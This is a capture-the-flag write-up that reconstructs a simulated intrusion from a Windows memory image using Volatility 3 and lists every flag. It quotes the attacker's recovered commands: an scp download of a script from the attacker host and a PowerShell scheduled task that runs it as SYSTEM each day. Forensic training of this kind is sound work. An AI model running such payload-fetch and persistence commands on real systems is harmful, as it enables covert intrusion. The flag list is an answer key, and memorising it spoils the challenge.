---
title: "Who Goes There? — Writeup"
ctf: "DEADFACE CTF 2026"
category: forensics
difficulty: medium
flag_format: "deadface{...}"
author: "arwah"
---

# Who Goes There? — Writeup

**Category:** Memory Forensics (Volatility 3)
**Artifacts:** `memory.raw` (8.5 GB, Windows 10 22H2, acquired with `go-winpmem`)
**Flags:**
`deadface{nkessler}` · `deadface{DMF-WS11-042}` · `deadface{dmf-fiels-01}` ·
`deadface{WindowsTelemetryCheck}` · `deadface{C:\ProgramData\WindowsCache\telemetry.ps1}`

## Summary

A rogue Kali device landed on De Monne Financial's network and someone used a
legitimate employee account to reach the file share. The workstation memory
holds the whole story: the attacker's SSH session, the persistence task they
installed, the typo'd WebDAV attempt at the executive share, and (buried in the
conhost screen buffer) every command they ran. The IR acquisition itself
(`go-winpmem` writing `E:\Acquisition\memory.raw`) is even visible as the last
console session — nice touch.

## Setup

```bash
vol -f memory.raw windows.info      # Win10 22H2, SystemTime 2026-09-27
vol -f memory.raw windows.pslist    # process timeline
vol -f memory.raw windows.cmdline
vol -f memory.raw windows.consoles  # <-- the money plugin
vol -f memory.raw windows.hashdump
```

## Flag 1 — compromised employee: `nkessler`

`pslist` shows an `sshd.exe` chain starting `2026-09-27 20:21:51 UTC`:

```
444   sshd.exe ("-R")
3532  sshd.exe ("-z")
5424  conhost.exe --headless ... -- "c:\windows\system32\cmd.exe"
8120  cmd.exe
3300  powershell.exe
```

`windows.consoles` dumps that conhost's screen buffer:

```
nkessler@DMF-WS11-042 C:\Users\nkessler>powershell
PS C:\Users\nkessler> scp d34th@10.77.10.66:/home/d34th/telemetry.ps1 C:\ProgramData\WindowsCache\
```

The SSH session — from the Kali box — authenticated as **nkessler**, then
staged malware and built persistence. `hashdump` corroborates the local
accounts (`nkessler`, `dmf_support`).

```
deadface{nkessler}
```

## Flag 2 — workstation hostname: `DMF-WS11-042`

Same console line: `nkessler@DMF-WS11-042` (capitalization preserved exactly as
displayed).

```
deadface{DMF-WS11-042}
```

## Flag 3 — misspelled server name: `dmf-fiels-01`

UNC-path scan over the raw image (`rg -a -b` for `\\\\dmf[...]*`) surfaces
ShellBag network items:

```
1188893429: \\dmf-fiels-01     <-- typo ("fiels")
1188895221: \\dmf-field-01     <-- correct
1366098357: \\dmf-fiel-01      <-- another typo
```

and nearby, WebDAV attempts at the executive share:

```
http://dmf-field-01/executive
http://dmf-fiels-01/executive   <-- the misspelled one reaching /executive
```

```
deadface{dmf-fiels-01}
```

## Flag 4 — persistence task name: `WindowsTelemetryCheck`

The attacker console shows the whole persistence ritual:

```powershell
$action   = New-ScheduledTaskAction -Execute 'powershell.exe' `
            -Argument '-NoProfile -File C:\ProgramData\WindowsCache\telemetry.ps1'
$trigger  = New-ScheduledTaskTrigger -Daily -At '23:59'
$principal= New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
Register-ScheduledTask -TaskName 'WindowsTelemetryCheck' -Action $action -Trigger $trigger -Principal $principal -Force
```

```
deadface{WindowsTelemetryCheck}
```

## Flag 5 — the script's full path

Straight from the task action above — an unusual directory that normally holds
nothing (`Test-Path ... False` before the scp):

```
deadface{C:\ProgramData\WindowsCache\telemetry.ps1}
```

## Attack chain reconstructed

1. Rogue Kali device (10.77.10.66) poisons LLMNR for `dmf-field-01`.
2. Nathan's workstation (DMF-WS11-042 / 10.77.10.20) leaks NTLMv2 for
   `nkessler` to the attacker (see *Uninvited Guest* pcap writeup).
3. Attacker SSHes into DMF-WS11-042 as nkessler (somehow in possession of the
   password), pulls `telemetry.ps1` from `d34th@10.77.10.66`, and registers the
   `WindowsTelemetryCheck` SYSTEM task for persistence.
